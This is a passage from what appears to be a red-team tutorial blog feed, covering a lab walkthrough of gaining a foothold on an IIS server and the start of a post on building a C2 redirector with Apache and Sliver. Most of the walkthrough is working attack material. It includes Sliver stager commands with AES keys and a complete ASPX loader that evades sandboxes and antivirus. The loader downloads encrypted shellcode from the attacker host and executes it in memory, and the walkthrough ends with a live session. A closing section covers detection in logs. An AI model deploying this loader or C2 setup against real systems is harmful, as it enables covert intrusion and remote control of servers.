class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ ports=$(nmap -p- --min-rate=1000 -T4 192.168.24.0/24 --exclude 192.168.24.1,192.168.24.2,192.168.24.138 | grep ^[0-9] | <span class="built_in">cut</span> -d <span class="string">&#x27;/&#x27;</span> -f 1 | <span class="built_in">tr</span> <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27;,&#x27;</span> | sed s/,$//)                      130 ⨯</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">$ nmap -sC -sV -p<span class="variable">$ports</span> 192.168.24.0/24 --exclude 192.168.24.1,192.168.24.2,192.168.24.138                                                             </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-09 18:06 EST</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.24.22</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">| http-methods: </span></span><br><span class="line"><span class="string">|_  Potentially risky methods: TRACE</span></span><br><span class="line"><span class="string">|_http-server-header: Microsoft-IIS/10.0</span></span><br><span class="line"><span class="string">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 253 IP addresses (1 host up) scanned in 14.99 seconds</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h3 id="RCE-through-file-upload"><a href="#RCE-through-file-upload" class="headerlink" title="RCE through file upload"></a>RCE through file upload</h3><ol><li>Surfing to <code>http://192.168.24.22</code>, we found a file upload form.</li></ol><img src="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/image-20230213153624960.png" class=""><ol start="2"><li>Following the upload link.</li></ol><img src="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/image-20230213153652929.png" class=""><blockquote><p>Windows defender is enabled on the target.</p></blockquote><ol start="3"><li><p>We have to upload an ASPX reverse shell that bypasses AV.</p></li><li><p>First, let’s luanch our C2 handler.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># We are using the redirector IP address for reverse shell.</span><br><span class="line">sliver &gt; profiles new --http  192.168.24.138 --skip-symbols --format shellcode --arch amd64 win64</span><br><span class="line"></span><br><span class="line">[*] Saved new implant profile win64</span><br><span class="line"></span><br><span class="line"># Staging should be encrypted and compressed.</span><br><span class="line"># We are using the host IP for staging, this will be handled by the redirection rules.</span><br><span class="line">sliver &gt; stage-listener --url https://192.168.25.128:8443 --profile win64  --compress gzip --aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&amp;E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV</span><br><span class="line"></span><br><span class="line">[*] No builds found for profile win64, generating a new one</span><br><span class="line">[*] Job 1 (https) started</span><br><span class="line">[*] AES KEY: D(G+KbPeShVmYq3t6v9y$B&amp;E)H@McQfT</span><br><span class="line">[*] AES IV: 8y/B?E(G+KbPeShV</span><br><span class="line">sliver &gt; https</span><br><span class="line"></span><br><span class="line">[*] Starting HTTPS :443 listener ...</span><br><span class="line"></span><br><span class="line">[*] Successfully started job #2</span><br><span class="line"></span><br><span class="line">sliver &gt; jobs </span><br><span class="line"></span><br><span class="line"> ID   Name    Protocol   Port </span><br><span class="line">==== ======= ========== ======</span><br><span class="line"> 1    https   tcp        8443 </span><br><span class="line"> 2    https   tcp        443  </span><br></pre></td></tr></table></figure></li><li><p>Since, the target only allows outgoing connections to port 443, our redirector should listen on this port.</p></li><li><p>Upload the below ASPX stager.</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">&quot;C#&quot;</span> AutoEventWireup=<span class="string">&quot;true&quot;</span> %&gt;</span><br><span class="line">&lt;%@ Import Namespace=<span class="string">&quot;System.IO&quot;</span> %&gt;</span><br><span class="line">&lt;%@ Import Namespace=<span class="string">&quot;System.IO.Compression&quot;</span> %&gt;</span><br><span class="line">&lt;%@ Import Namespace=<span class="string">&quot;System.Text&quot;</span> %&gt;</span><br><span class="line">&lt;%@ Import Namespace=<span class="string">&quot;System&quot;</span> %&gt;</span><br><span class="line">&lt;%@ Import Namespace=<span class="string">&quot;System.Net&quot;</span> %&gt;</span><br><span class="line">&lt;%@ Import Namespace=<span class="string">&quot;System.Security.Cryptography&quot;</span> %&gt;</span><br><span class="line">&lt;%@ Import Namespace=<span class="string">&quot;System.Security.Cryptography.X509Certificates&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;script runat=<span class="string">&quot;server&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Int32 MEM_COMMIT=<span class="number">0x1000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)<span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">System.Runtime.InteropServices.DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">VirtualAlloc</span>(<span class="params">IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect</span>)</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">System.Runtime.InteropServices.DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,<span class="keyword">ref</span> IntPtr lpThreadId</span>)</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">System.Runtime.InteropServices.DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">Sleep</span>(<span class="params"><span class="built_in">uint</span> dwMilliseconds</span>)</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">System.Runtime.InteropServices.DllImport(<span class="string">&quot;kernel32.dll&quot;</span>, SetLastError = true, ExactSpelling = true)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">VirtualAllocExNuma</span>(<span class="params">IntPtr hProcess, IntPtr lpAddress, <span class="built_in">uint</span> dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred</span>)</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">System.Runtime.InteropServices.DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">GetCurrentProcess</span>()</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">Page_Load</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">    </span><br><span class="line">        DateTime t1 = <span class="keyword">new</span> DateTime();</span><br><span class="line">        Sleep(<span class="number">2000</span>);</span><br><span class="line">        Double t2 = DateTime.Now.Subtract(t1).TotalSeconds;</span><br><span class="line">        <span class="keyword">if</span> (t2 &lt; <span class="number">1.5</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, <span class="number">0x1000</span>, <span class="number">0x3000</span>, <span class="number">0x4</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (mem == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="built_in">string</span> AESKey = <span class="string">&quot;D(G+KbPeShVmYq3t6v9y$B&amp;E)H@McQfT&quot;</span>;</span><br><span class="line">        <span class="built_in">string</span> AESIV = <span class="string">&quot;8y/B?E(G+KbPeShV&quot;</span>;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        ServicePointManager.Expect100Continue = <span class="literal">true</span>;</span><br><span class="line">        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;</span><br><span class="line">        ServicePointManager.CertificatePolicy = <span class="keyword">new</span> TrustAllCertsPolicy();</span><br><span class="line">        WebClient client = <span class="keyword">new</span> WebClient();</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">byte</span>[] shellcode = client.DownloadData(<span class="string">&quot;https://192.168.24.138/test.woff&quot;</span>);</span><br><span class="line">        </span><br><span class="line">List&lt;<span class="built_in">byte</span>&gt; l = <span class="keyword">new</span> List&lt;<span class="built_in">byte</span>&gt; &#123; &#125;;   </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">16</span>; i &lt;= shellcode.Length <span class="number">-1</span>; i++) &#123;</span><br><span class="line">            l.Add(shellcode[i]);</span><br><span class="line">        &#125;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">       <span class="built_in">byte</span>[] actual = l.ToArray();</span><br><span class="line"></span><br><span class="line">       <span class="built_in">byte</span>[] decrypted;</span><br><span class="line"></span><br><span class="line">       decrypted = Decrypt(actual, AESKey, AESIV);</span><br><span class="line">        </span><br><span class="line">        IntPtr nDiIR7etNU = VirtualAlloc(IntPtr.Zero,(UIntPtr)decrypted.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">        System.Runtime.InteropServices.Marshal.Copy(decrypted,<span class="number">0</span>,nDiIR7etNU,decrypted.Length);</span><br><span class="line">        IntPtr dd8T1w6 = IntPtr.Zero;</span><br><span class="line">        IntPtr rFfyR = CreateThread(IntPtr.Zero,UIntPtr.Zero,nDiIR7etNU,IntPtr.Zero,<span class="number">0</span>,<span class="keyword">ref</span> dd8T1w6);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TrustAllCertsPolicy</span> : <span class="title">ICertificatePolicy</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">bool</span> <span class="title">CheckValidationResult</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">        ServicePoint srvPoint, X509Certificate certificate, WebRequest request, <span class="built_in">int</span> certificateProblem</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="built_in">byte</span>[] <span class="title">Decompress</span>(<span class="params"><span class="built_in">byte</span>[] bytes</span>)</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">using</span> (<span class="keyword">var</span> memoryStream = <span class="keyword">new</span> MemoryStream(bytes))</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">using</span> (<span class="keyword">var</span> outputStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">using</span> (<span class="keyword">var</span> decompressStream = <span class="keyword">new</span> GZipStream(memoryStream, CompressionMode.Decompress))</span><br><span class="line">                    &#123;</span><br><span class="line">                        decompressStream.CopyTo(outputStream);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> outputStream.ToArray();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="built_in">byte</span>[] <span class="title">Decrypt</span>(<span class="params"><span class="built_in">byte</span>[] ciphertext, <span class="built_in">string</span> AESKey, <span class="built_in">string</span> AESIV</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">byte</span>[] key = Encoding.UTF8.GetBytes(AESKey);</span><br><span class="line">            <span class="built_in">byte</span>[] IV = Encoding.UTF8.GetBytes(AESIV);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (Aes aesAlg = Aes.Create())</span><br><span class="line">            &#123;</span><br><span class="line">                aesAlg.Key = key;</span><br><span class="line">                aesAlg.IV = IV;</span><br><span class="line">                aesAlg.Padding = PaddingMode.None;</span><br><span class="line"></span><br><span class="line">                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream(ciphertext))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">using</span> (CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))</span><br><span class="line">                    &#123;</span><br><span class="line">                        cryptoStream.Write(ciphertext, <span class="number">0</span>, ciphertext.Length);</span><br><span class="line">                        <span class="keyword">return</span> Decompress(memoryStream.ToArray());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>Upload this file as <code>test.aspx</code>.</p><img src="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/image-20230213155120945.png" class=""><img src="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/image-20230213155141959.png" class=""></li><li><p>Now, we have to found where is this file locate don the target.</p></li><li><p>We can use <em>gobuster</em> to list target directories.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ gobuster <span class="built_in">dir</span> -u http://192.168.24.22 -w /usr/share/wordlists/dirb/common.txt -t 100                                                                                                      130 ⨯</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.2.0-dev</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.24.22</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 100</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.2.0-dev</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2023/02/13 08:34:28 Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/aspnet_client        (Status: 301) [Size: 158] [--&gt; http://192.168.24.22/aspnet_client/]</span><br><span class="line">/index.html           (Status: 200) [Size: 149]</span><br><span class="line">/upload               (Status: 301) [Size: 151] [--&gt; http://192.168.24.22/upload/]</span><br><span class="line">Progress: 4408 / 4615 (95.51%)===============================================================</span><br><span class="line">2023/02/13 08:34:30 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure></li><li><p>There is an upload folder, so let’s surf to <code>http://192.168.24.22/upload/test.aspx</code>.</p></li><li><p>A few seconds later, we recieved a shell from the target.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">sliver &gt; jobs </span><br><span class="line"></span><br><span class="line"> ID   Name    Protocol   Port </span><br><span class="line">==== ======= ========== ======</span><br><span class="line"> 2    https   tcp        443  </span><br><span class="line"> 4    https   tcp        8443 </span><br><span class="line"></span><br><span class="line">[*] Session 239944da BACK_BUG - tcp([::1]:35566)-&gt;192.168.24.22 (castelblack) - windows/amd64 - Mon, 13 Feb 2023 09:31:57 EST</span><br><span class="line"></span><br><span class="line">sliver &gt; sessions </span><br><span class="line"></span><br><span class="line"> ID         Name       Transport   Remote Address                    Hostname      Username   Operating System   Locale   Last Message                            Health  </span><br><span class="line">========== ========== =========== ================================= ============= ========== ================== ======== ======================================= =========</span><br><span class="line"> 239944da   BACK_BUG   http(s)     tcp([::1]:35566)-&gt;192.168.24.22   castelblack   &lt;err&gt;      windows/amd64      en-US    Mon Feb 13 09:33:08 EST 2023 (2s ago)   [ALIVE] </span><br><span class="line"></span><br><span class="line">sliver &gt; sessions -i 239944da</span><br><span class="line"></span><br><span class="line">[*] Active session BACK_BUG (239944da)</span><br><span class="line"></span><br><span class="line">sliver (BACK_BUG) &gt; whoami </span><br><span class="line"></span><br><span class="line">Logon ID: &lt;err&gt;</span><br><span class="line">[*] Current Token ID: IIS APPPOOL\DefaultAppPool</span><br><span class="line">sliver (BACK_BUG) &gt; info </span><br><span class="line"></span><br><span class="line">        Session ID: 239944da-46ad-4713-ba3d-752eeddd955d</span><br><span class="line">              Name: BACK_BUG</span><br><span class="line">          Hostname: castelblack</span><br><span class="line">              UUID: 15254d56-94dd-cb7a-7637-ca4b44270e75</span><br><span class="line">          Username: &lt;err&gt;</span><br><span class="line">               UID: &lt;err&gt;</span><br><span class="line">               GID: &lt;err&gt;</span><br><span class="line">               PID: 2732</span><br><span class="line">                OS: windows</span><br><span class="line">           Version: Server 2016 build 17763 x86_64</span><br><span class="line">            Locale: en-US</span><br><span class="line">              Arch: amd64</span><br><span class="line">         Active C2: https://192.168.24.138</span><br><span class="line">    Remote Address: tcp([::1]:35566)-&gt;192.168.24.22</span><br><span class="line">         Proxy URL: </span><br><span class="line">Reconnect Interval: 1m0s</span><br><span class="line">     First Contact: Mon Feb 13 09:31:57 EST 2023 (1m29s ago)</span><br><span class="line">      Last Checkin: Mon Feb 13 09:33:14 EST 2023 (12s ago)</span><br></pre></td></tr></table></figure></li><li><p>As shown in the snippet above, we are running as <code>IIS APPPOOL\DefaultAppPool</code>.</p></li><li><p>In the next post we will try to escalate our privilege to a higher user on the system.</p></li></ol><h2 id="Observations"><a href="#Observations" class="headerlink" title="Observations"></a>Observations</h2><p>By checking the target logs, we are actually expecting something that refers to the file eupload and compilation of our .Net reverse shell.</p><p>I’m using Elastic stack for logs inspection.</p><img src="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/image-20230223172811109.png" class=""><p>The main actions of interest are “File Created” and “Process Create”, these refers to the file upload, file compilation, result save.</p><p>The process tree indicates that the IIS proces <code>w3wp.exe</code> is the root for these actions, it fired <code>csc.exe</code> to compile the uploaded ASPX file, and <code>csc.exe</code> in turn calls <code>VBCSCompiler.exe</code> to accomplish that.</p><p>It is worth mentioning that we are injecting into the same process <code>w3wp.exe</code>, so there are no other process created, but we may have to migrate to a more stable process other than this one.</p><img src="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/image-20230223174155794.png" class="">]]></content>
      
      
      <categories>
          
          <category> red team </category>
          
          <category> intial access </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sliver </tag>
            
            <tag> file upload </tag>
            
            <tag> aspx </tag>
            
            <tag> windows defender </tag>
            
            <tag> AV </tag>
            
            <tag> T1190 </tag>
            
            <tag> T1055 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0. Basic Red Team Infrastructure</title>
      <link href="https://mmnoureldin.github.io/Red-Team/2023/02/01/Basic-Red-Team-Infrastructure/"/>
      <url>https://mmnoureldin.github.io/Red-Team/2023/02/01/Basic-Red-Team-Infrastructure/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This post is about how to install a red team basic infrastructure using Apache web server and Sliver C2 framework from BishopFox. It is meant as the kickoff post for a series of tutorial posts on how to perform red teaming excercises from my experiments.</p><h2 id="Diagram"><a href="#Diagram" class="headerlink" title="Diagram"></a>Diagram</h2><p>Through this post I will use a network setup like the one in the below image.</p><img src="https://mmnoureldin.github.io/Red-Team/2023/02/01/Basic-Red-Team-Infrastructure/image-20230131164406408.png" class=""><h2 id="Setup-Apache-Redirector"><a href="#Setup-Apache-Redirector" class="headerlink" title="Setup Apache Redirector"></a>Setup Apache Redirector</h2><p>Redirectors are used as a protection for team server, it shouldn’t reach team server directly in anyway. Traffic from victim corporate should land on the redirector then, redirector will decided how to forward it as per the configured rules.</p><span id="more"></span><p>In our case we are going to use Apache web server as the redirector, moreover we will use its’ redirection rules to forward our C2 connections.</p><ol><li><p>In real life scenarios, we should have a public server with valid certificate and a domain name, it may also host any fake web site.</p></li><li><p>As we are using a local lab, we will add our redirector hostname to the local hosts file or to the local DNS server. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">operator-0@redirector-0:~$ <span class="built_in">cat</span> /etc/hosts</span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.1.1 redirector-0</span><br><span class="line">127.0.0.1 fake-host.com</span><br><span class="line">192.168.24.138 fake-host.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># The following lines are desirable for IPv6 capable hosts</span></span><br><span class="line">::1     ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br></pre></td></tr></table></figure></li><li><p>Install Apache web server and all required modules.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install apache.</span></span><br><span class="line">operator-0@redirector-0:~$ sudo apt install apache2</span><br><span class="line"></span><br><span class="line"><span class="comment"># install required modules.</span></span><br><span class="line">operator-0@redirector-0:~$ sudo a2enmod ssl rewrite proxy proxy_http</span><br><span class="line"></span><br><span class="line"><span class="comment"># list default configuration.</span></span><br><span class="line">operator-0@redirector-0:~$ <span class="built_in">cd</span> /etc/apache2/sites-enabled/</span><br><span class="line">operator-0@redirector-0:/etc/apache2/sites-enabled$ <span class="built_in">ls</span> -l</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 2 root root 4096 Jan 27 23:19 ./</span><br><span class="line">drwxr-xr-x 8 root root 4096 Jan 27 23:19 ../</span><br><span class="line">lrwxrwxrwx 1 root root   35 Jan 27 23:19 000-default.conf -&gt; ../sites-available/000-default.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># remove default configuration.</span></span><br><span class="line">operator-0@redirector-0:/etc/apache2/sites-enabled$ sudo <span class="built_in">rm</span> 000-default.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># link default ssl configuration.</span></span><br><span class="line">operator-0@redirector-0:/etc/apache2/sites-enabled$ sudo <span class="built_in">ln</span> -s ../sites-available/default-ssl.conf .</span><br><span class="line">operator-0@redirector-0:/etc/apache2/sites-enabled$ <span class="built_in">ls</span> -l</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 2 root root 4096 Jan 27 23:27 ./</span><br><span class="line">drwxr-xr-x 8 root root 4096 Jan 27 23:19 ../</span><br><span class="line">lrwxrwxrwx 1 root root   35 Jan 27 23:27 default-ssl.conf -&gt; ../sites-available/default-ssl.conf</span><br></pre></td></tr></table></figure></li><li><p>Redirector should proof a valid SSL certificate to make evrything looks normal and benign.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 